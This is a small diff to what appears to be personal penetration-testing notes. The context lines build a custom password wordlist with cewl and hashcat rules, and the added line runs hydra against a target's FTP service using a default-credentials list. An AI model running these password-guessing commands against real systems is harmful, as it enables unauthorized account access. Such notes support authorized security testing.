@@ -28,6 +28,9 @@ cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
 cat users.txt >> custom-wordlist.txt
 echo "summer\nwinter\nspring\nfall\n$dom" >> custom-wordlist.txt
 hashcat --stdout -a 0 -r ~/repos/offsec/customizations/bdg.rule custom-wordlist.txt | awk '!a[$0]++ {print $0}' >> custom-passwords.txt
+
+hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip ftp
+
 ```
 
 ### Crunch
